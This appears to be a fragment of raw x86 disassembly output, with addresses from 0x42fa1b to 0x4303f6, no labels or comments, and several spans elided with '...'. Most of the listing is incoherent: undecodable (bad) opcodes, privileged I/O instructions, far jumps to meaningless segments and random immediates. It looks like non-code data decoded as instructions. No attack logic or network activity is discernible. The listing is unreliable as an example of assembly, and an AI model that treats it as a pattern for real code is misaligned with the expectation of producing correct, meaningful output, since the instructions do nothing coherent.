  42fa1b:	and    ebx,DWORD PTR [ecx-0xa]
  42fa1e:	test   DWORD PTR [edx],esp
  42fa20:	mov    eax,0xd97f5257
  42fa25:	add    cl,bl
  42fa27:	dec    eax
  42fa28:	sub    DWORD PTR [eax],ebx
  42fa2a:	xchg   ebx,eax
  42fa2b:	and    ch,BYTE PTR [edi+edx*1+0x1e]
  42fa2f:	mov    esp,DWORD PTR [ebx]
  42fa31:	inc    edi
  42fa32:	fadd   st,st(4)
  42fa34:	imul   ebx,DWORD PTR [ebx-0x3],0x61ce25c
  42fa3b:	or     al,0xd9
  42fa3d:	dec    eax
  42fa3e:	lock xchg BYTE PTR [edi-0x31de85c8],dh
  42fa45:	and    al,0x13
  42fa47:	jmp    0x22baedb4
  42fa4c:	add    al,0x36
  42fa4e:	cld    
  42fa4f:	enter  0x385e,0xe4
  42fa53:	inc    esp
  42fa54:	data16 loope 0x42fa2c
  42fa57:	cmp    esp,DWORD PTR [esi-0x44b97a1]
  42fa5d:	cmp    BYTE PTR [edi],0xbb
  42fa60:	mov    DWORD PTR [ecx-0x1e35a5d6],esi
  42fa66:	dec    edi
  42fa67:	xchg   ebp,eax
  42fa68:	nop
  42fa69:	in     al,dx
  42fa6a:	je     0x42fa9a
  42fa6c:	adc    eax,0x6956cd3e
  42fa71:	push   ebp
  42fa72:	enter  0x22d5,0x92
  42fa76:	push   esi
  42fa77:	and    edx,DWORD PTR [esi+0x7f]
  42fa7a:	outs   dx,BYTE PTR ds:[esi]
  42fa7b:	push   ebp
  42fa7c:	jno    0x42fa48
  42fa7e:	mov    bl,0x52
  42fa80:	mov    ecx,ds
  42fa82:	loope  0x42fad9
  42fa84:	add    eax,0x7fc98090
  42fa89:	nop
  42fa8a:	not    DWORD PTR [edx+0x4253f4f1]
  42fa90:	fadd   DWORD PTR [eax]
	...
  42faf2:	add    BYTE PTR [eax],al
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	mov    ebx,0xa4a90b77
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0x1,al
  42fb0d:	mov    edi,DWORD PTR [esp+ebp*1-0x9]
  42fb11:	test   al,0x23
  42fb13:	stos   DWORD PTR es:[edi],eax
  42fb14:	push   eax
  42fb15:	les    esi,FWORD PTR [ecx+ebx*8+0x2d37e2c3]
  42fb1c:	pop    edx
  42fb1d:	cdq    
  42fb1e:	out    dx,al
  42fb1f:	xchg   ebx,eax
  42fb20:	call   0xfc2a64b9
  42fb25:	pop    edx
  42fb26:	rcl    BYTE PTR [ebx+0x2c010cbd],cl
  42fb2c:	aas    
  42fb2d:	les    ecx,FWORD PTR [ebx-0x72]
  42fb30:	push   ecx
  42fb31:	mov    bl,0x3d
  42fb33:	or     ah,BYTE PTR [esi+0x470f5c60]
  42fb39:	retf   
  42fb3a:	adc    eax,0x4a6ffd0f
  42fb3f:	jb     0x42fae8
  42fb41:	pop    edi
  42fb42:	(bad)  
  42fb43:	mov    ah,0x26
  42fb45:	in     eax,0x79
  42fb47:	loop   0x42fb9f
  42fb49:	xchg   edi,eax
  42fb4a:	and    bl,al
  42fb4c:	mov    eax,0xa1f208ed
  42fb51:	shr    BYTE PTR [ecx+0x48],1
  42fb54:	mov    ebx,0x6cda8819
  42fb59:	jmp    0xfd1771c5
  42fb5e:	sub    DWORD PTR [edi],esp
  42fb60:	xor    eax,0xc4be10f2
  42fb65:	mov    ebx,DWORD PTR [ebx+0x2346ac73]
  42fb6b:	leave  
  42fb6c:	sbb    al,0xe0
  42fb6e:	idiv   BYTE PTR [ebp-0x60a05698]
  42fb74:	xor    al,0x49
  42fb76:	xchg   ebp,eax
  42fb77:	les    ebx,FWORD PTR [ebp+0x6be0850c]
  42fb7d:	sahf   
  42fb7e:	and    edi,esi
  42fb80:	xchg   edi,eax
  42fb81:	dec    ebp
  42fb82:	and    al,0x49
  42fb84:	xlat   BYTE PTR ds:[ebx]
  42fb85:	add    al,0xb6
  42fb87:	stos   BYTE PTR es:[edi],al
  42fb88:	dec    eax
  42fb89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb8a:	sub    al,BYTE PTR [eax+ebx*2]
  42fb8d:	sub    ah,BYTE PTR [edi]
  42fb8f:	xchg   ebx,eax
  42fb90:	adc    al,0x83
  42fb92:	mov    bh,0xe
  42fb94:	mov    edx,0xff6247b4
  42fb99:	push   0x5b8aa43d
  42fb9e:	dec    ebx
  42fb9f:	push   edx
  42fba0:	adc    ecx,DWORD PTR [ebx-0x75]
  42fba3:	hlt    
  42fba4:	pshufw mm6,QWORD PTR [esi+edi*2],0x5f
  42fba9:	fstp   TBYTE PTR [edx]
  42fbab:	cmp    edx,ebx
  42fbad:	mov    ecx,0xf0f73db6
  42fbb2:	push   esp
  42fbb3:	rcr    BYTE PTR [ebx],cl
  42fbb5:	(bad)  
  42fbb7:	xchg   esp,eax
  42fbb8:	dec    ecx
  42fbb9:	sub    ebp,DWORD PTR [edi-0x48]
  42fbbc:	lods   eax,DWORD PTR ds:[esi]
  42fbbd:	pop    ecx
  42fbbe:	inc    eax
  42fbbf:	mov    bl,0x83
  42fbc1:	outs   dx,DWORD PTR ds:[esi]
  42fbc2:	sti    
  42fbc3:	dec    edx
  42fbc4:	inc    ebx
  42fbc5:	retf   
  42fbc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbc7:	and    BYTE PTR [eax-0x16],dh
  42fbca:	pop    ebx
  42fbcb:	fcmovu st,st(3)
  42fbcd:	mov    al,ds:0x5bdd842f
  42fbd2:	add    eax,0xa3f1a06d
  42fbd7:	xor    eax,DWORD PTR [ebx+0x5c8b13ce]
  42fbdd:	shl    DWORD PTR [esi+0x654db99],0xdb
  42fbe4:	mov    esi,0xcb13604c
  42fbe9:	mov    bh,0x6b
  42fbeb:	xchg   edi,eax
  42fbec:	popf   
  42fbed:	push   ebx
  42fbee:	in     eax,0x98
  42fbf0:	jle    0x42fb7d
  42fbf2:	mov    DWORD PTR [edx],edi
  42fbf4:	jg     0x42fc62
  42fbf6:	add    bl,ah
  42fbf8:	outs   dx,DWORD PTR ds:[esi]
  42fbf9:	mov    esp,0xecff10ae
  42fbfe:	cmp    eax,0x344d71d6
  42fc03:	cmp    eax,DWORD PTR [edi-0x72]
  42fc06:	cmp    eax,0x626408bb
  42fc0b:	mov    al,ds:0x94d63306
  42fc10:	dec    ecx
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x6f14:0x2036325e
  42fc82:	sub    eax,0x200a98b
  42fc87:	add    BYTE PTR ds:0xc9000001,al
  42fc8d:	aad    0xa9
  42fc8f:	xchg   edx,eax
  42fc90:	mov    dl,0xdb
  42fc92:	daa    
  42fc93:	test   BYTE PTR [esi-0x6c04cc09],al
  42fc99:	mov    al,ds:0xb48b23d8
  42fc9e:	xchg   edx,eax
  42fc9f:	nop
  42fca0:	inc    esp
  42fca1:	sub    edi,DWORD PTR [ecx+0x73]
  42fca4:	xor    DWORD PTR [edi],0x20
  42fca7:	xor    DWORD PTR [edi+0xb227984],ebp
  42fcad:	retf   
  42fcae:	adc    al,0x9a
  42fcb0:	shl    BYTE PTR [eax+0x3a3b0b96],cl
  42fcb6:	hlt    
  42fcb7:	adc    eax,0x52e143a7
  42fcbc:	leave  
  42fcbd:	pop    ds
  42fcbe:	cmp    DWORD PTR ds:0xd5328560,ebx
  42fcc4:	neg    cl
  42fcc6:	pusha  
  42fcc7:	jae    0x42fcd0
  42fcc9:	xchg   edi,eax
  42fcca:	arpl   WORD PTR [ebx],di
  42fccc:	enter  0x8947,0x46
  42fcd0:	pop    ecx
  42fcd1:	and    edi,esi
  42fcd3:	sahf   
  42fcd4:	and    eax,0x9f4ddaa5
  42fcd9:	jp     0x42fc84
  42fcdb:	sbb    ah,BYTE PTR [edi+0x10758122]
  42fce1:	push   cs
  42fce2:	ins    BYTE PTR es:[edi],dx
  42fce3:	out    dx,al
  42fce4:	inc    esp
  42fce5:	cmp    edx,DWORD PTR [ecx]
  42fce7:	xchg   ebp,eax
  42fce8:	pop    esi
  42fce9:	mov    ds,WORD PTR [eax]
  42fceb:	outs   dx,DWORD PTR ds:[esi]
  42fcec:	stos   DWORD PTR es:[edi],eax
  42fced:	scas   al,BYTE PTR es:[edi]
  42fcee:	push   0x20f86d8e
  42fcf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcf4:	ss jle 0x42fc88
  42fcf7:	xchg   ebx,eax
  42fcf8:	inc    ecx
  42fcf9:	xchg   edi,eax
  42fcfa:	lds    ebp,FWORD PTR [edi+0x74]
  42fcfd:	adc    al,0x1d
  42fcff:	cmp    al,bh
  42fd01:	mov    bh,0xa0
  42fd03:	dec    ebx
  42fd04:	(bad)  
  42fd05:	test   DWORD PTR [eax],0xf389e964
  42fd0b:	enter  0x1108,0x79
  42fd0f:	cmp    BYTE PTR [edx-0x7],bl
  42fd12:	mov    ch,0xa6
  42fd14:	add    eax,0x901a154c
  42fd19:	adc    eax,0x457c8d2a
  42fd1e:	(bad)  
  42fd1f:	or     edx,DWORD PTR [edi+esi*1]
  42fd22:	or     edi,esi
  42fd24:	xor    al,0x97
  42fd26:	lock push es
  42fd28:	test   BYTE PTR [edi],ch
  42fd2a:	test   eax,0xd44fbda9
  42fd2f:	xchg   ebx,eax
  42fd30:	xchg   esi,ecx
  42fd32:	and    al,0x89
  42fd34:	sub    BYTE PTR [ebp+edi*2-0x14],al
  42fd38:	and    eax,0x146948fa
  42fd3d:	add    ah,ch
  42fd3f:	xor    ebp,DWORD PTR [esi-0x3e]
  42fd42:	outs   dx,BYTE PTR ds:[esi]
  42fd43:	adc    al,0x36
  42fd45:	and    eax,DWORD PTR [eax]
  42fd47:	jns    0x42fce8
  42fd49:	adc    BYTE PTR [ecx+0x4534996f],cl
  42fd4f:	push   ecx
  42fd50:	fisttp WORD PTR [ebx]
  42fd52:	es sub al,0xb9
  42fd55:	icebp  
  42fd56:	and    DWORD PTR [ebx-0x31b31633],esp
  42fd5c:	ins    BYTE PTR es:[edi],dx
  42fd5d:	inc    edi
  42fd5e:	jae    0x42fddb
  42fd60:	jg     0x42fdba
  42fd62:	mov    eax,0x40a1c83d
  42fd67:	xchg   esi,eax
  42fd68:	mov    ebp,0x8ce136f7
  42fd6d:	imul   edi,DWORD PTR [ebx],0x3b229337
  42fd73:	(bad)  
  42fd75:	sub    BYTE PTR ds:0x206b45b4,cl
  42fd7b:	or     BYTE PTR [esi+0x54654da2],al
  42fd81:	sbb    ecx,edx
  42fd83:	mov    cl,al
  42fd85:	push   ebp
  42fd86:	and    DWORD PTR [ecx+0x5e7be30],edx
  42fd8c:	xchg   ebx,eax
  42fd8d:	mov    al,0xf6
  42fd8f:	sub    DWORD PTR [ebx],0x0
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz inc edx
  42fe01:	mov    cl,0xa4
  42fe03:	scas   al,BYTE PTR es:[di]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x16000001,al
  42fe0d:	ds test eax,0x4d4f8ee0
  42fe13:	je     0x42fe75
  42fe15:	cdq    
  42fe16:	and    eax,0xf1334f55
  42fe1b:	push   edx
  42fe1c:	xor    DWORD PTR [edi],edi
  42fe1e:	lods   al,BYTE PTR ds:[esi]
  42fe1f:	fisttp DWORD PTR [edx-0x24]
  42fe22:	mov    DWORD PTR [esi],ecx
  42fe24:	fstp   DWORD PTR [edx+0x2ed10ebb]
  42fe2a:	sub    ebp,ebx
  42fe2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe2d:	test   BYTE PTR [ebx],0xfd
  42fe30:	sbb    DWORD PTR [esi-0x5f3dde4a],edx
  42fe36:	adc    BYTE PTR [edx-0x25],al
  42fe39:	jo     0x42fe85
  42fe3b:	mov    edx,0x8df08e64
  42fe40:	lahf   
  42fe41:	cmp    al,0xc8
  42fe43:	in     eax,dx
  42fe44:	jmp    0x42fe33
  42fe46:	retf   0x6ed
  42fe49:	sbb    BYTE PTR ds:0xdbf9a6de,0x11
  42fe50:	test   DWORD PTR [edi-0x61],0x5a774ac5
  42fe57:	icebp  
  42fe58:	int3   
  42fe59:	rcl    DWORD PTR [edi+0x18952e18],1
  42fe5f:	daa    
  42fe60:	add    esi,DWORD PTR [ecx]
  42fe62:	inc    eax
  42fe63:	push   ss
  42fe64:	out    dx,eax
  42fe65:	test   BYTE PTR [ebx-0x2c8d48c5],ah
  42fe6b:	es add eax,0x3cafec24
  42fe72:	fsubr  DWORD PTR [esi+0x1f662bc2]
  42fe78:	out    0x92,al
  42fe7a:	cmp    al,dl
  42fe7c:	and    dh,al
  42fe7e:	(bad)  
  42fe7f:	lea    edi,ds:0xd236849d
  42fe85:	cmp    al,0xc0
  42fe87:	fdivr  DWORD PTR [eax+0x3f7acc5e]
  42fe8d:	jnp    0x42fe79
  42fe8f:	pushf  
  42fe90:	or     bh,BYTE PTR [ebp+0x26f34610]
  42fe96:	dec    edx
  42fe97:	rcl    BYTE PTR [ebx+0x39],0xe1
  42fe9b:	inc    edx
  42fe9c:	aad    0x31
  42fe9e:	sets   BYTE PTR [ebp-0x226838fe]
  42fea5:	test   ah,bl
  42fea7:	pop    ds
  42fea8:	cli    
  42fea9:	jg     0x42fea2
  42feab:	mov    edx,0x27b26b0c
  42feb0:	pop    ebp
  42feb1:	(bad)  
  42feb2:	fmul   DWORD PTR [ecx+ecx*2]
  42feb5:	and    al,0x4
  42feb7:	add    dl,BYTE PTR [eax+0x3ac06810]
  42febd:	stc    
  42febe:	push   eax
  42febf:	jnp    0x42ff10
  42fec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fec2:	add    DWORD PTR [esi+0x56],edi
  42fec5:	aas    
  42fec6:	push   ebp
  42fec7:	xchg   edi,eax
  42fec8:	xor    eax,0x5b27505b
  42fecd:	in     eax,0xdf
  42fecf:	dec    ebx
  42fed0:	call   0xc1c83fd8
  42fed5:	lods   al,BYTE PTR ds:[esi]
  42fed6:	inc    eax
  42fed7:	jg     0x42ff11
  42fed9:	cdq    
  42feda:	aaa    
  42fedb:	mov    ebp,0xa7586362
  42fee0:	retf   
  42fee1:	lahf   
  42fee2:	retf   
  42fee3:	pop    ebp
  42fee4:	sub    BYTE PTR [esi+0xb8a61ac],dh
  42feea:	adc    eax,0xdf63955f
  42feef:	dec    BYTE PTR [ebp-0x21b6ce2e]
  42fef5:	iret   
  42fef6:	(bad)  
  42fef7:	cld    
  42fef8:	add    eax,0x319e51e8
  42fefd:	mov    esi,DWORD PTR [edi]
  42feff:	push   0xffffffec
  42ff01:	das    
  42ff02:	cmp    cl,BYTE PTR [edi]
  42ff04:	jge    0x42fea8
  42ff06:	jmp    0xfe4ab271
  42ff0b:	jbe    0x42ff0d
  42ff0d:	dec    ebp
  42ff0e:	mov    edx,0x1155
	...
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ebx+esi*2-0x23],0x38
  42ff83:	imul   esi,DWORD PTR [ebx+0x72000202],0x0
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	sbb    DWORD PTR [eax-0x47],ebx
  42ff8f:	(bad)
  42ff93:	mov    bh,cl
  42ff95:	and    BYTE PTR ds:0xa860e428,al
  42ff9b:	mov    ebx,0x296a40b3
  42ffa0:	icebp  
  42ffa1:	jmp    0xeee5:0xdade1a2e
  42ffa8:	ret    0x925d
  42ffab:	jmp    0x3eadbdc5
  42ffb0:	mov    al,0x1f
  42ffb2:	mov    WORD PTR [edx+edx*4+0x51],ss
  42ffb6:	jo     0xc0c0df49
  42ffbc:	fwait
  42ffbd:	jne    0x430000
  42ffbf:	retf   0x649e
  42ffc2:	imul   BYTE PTR [edx+0x14]
  42ffc5:	xchg   DWORD PTR [eax+esi*4+0x26],edx
  42ffc9:	or     DWORD PTR [esi+0x5bad7787],esp
  42ffcf:	stos   DWORD PTR es:[edi],eax
  42ffd0:	jmp    0xbe1c:0x50f4373f
  42ffd7:	jmp    0xaa9367bb
  42ffdc:	pusha  
  42ffdd:	into   
  42ffde:	or     eax,0x87aff0ca
  42ffe3:	jns    0x43002f
  42ffe5:	int    0x70
  42ffe7:	retf   
  42ffe8:	iret   
  42ffe9:	xor    al,0x65
  42ffeb:	pop    ebp
  42ffec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ffed:	mov    ah,0xc4
  42ffef:	(bad)  
  42fff0:	loopne 0x42ffa3
  42fff2:	shl    BYTE PTR [edx+eiz*2+0x43d1e536],cl
  42fff9:	xor    BYTE PTR [ebx],bh
  42fffb:	stos   DWORD PTR es:[edi],eax
  42fffc:	sub    eax,0x4f
	...
  430071:	add    BYTE PTR [eax],al
  430073:	add    BYTE PTR [ebp+0x55],cl
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
